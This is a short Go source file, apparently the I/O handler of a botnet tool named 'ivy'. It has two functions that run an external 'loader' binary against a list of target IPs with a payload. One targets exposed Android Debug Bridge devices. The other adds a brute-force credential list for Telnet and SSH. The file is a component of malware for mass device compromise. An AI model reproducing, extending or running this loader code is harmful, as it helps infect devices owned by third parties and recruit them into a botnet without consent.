package io

import (
	"os"
	"fmt"
	"os/exec"
	config "ivy/util/config"
)


/*
    *    util/io/handler.go
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


func ExecuteLoaderOptionsADB() {
	bin := exec.Command("b", config.LOADER_OPTION, config.LOADER_IP_LIST, config.LOADER_PAYLOAD)

	bin.Stderr = os.Stderr
	bin.Stdout = os.Stdout
	bin.Stdin = os.Stdin

	if err := bin.Start(); err != nil {
		panic(err)
	}

	if err := bin.Wait(); err != nil { 
		fmt.Println("Error: Could not execute loader!")
	}
}

func ExecuteLoaderOptionsTelnetandSSH() {
	bin := exec.Command("b", config.LOADER_OPTION, config.LOADER_IP_LIST, config.LOADER_BRUTE_LIST, config.LOADER_PAYLOAD)

	bin.Stderr = os.Stderr
	bin.Stdout = os.Stdout
	bin.Stdin = os.Stdin

	if err := bin.Start(); err != nil {
		panic(err)
	}

	if err := bin.Wait(); err != nil { 
		fmt.Println("Error: Could not execute loader!")
	}
}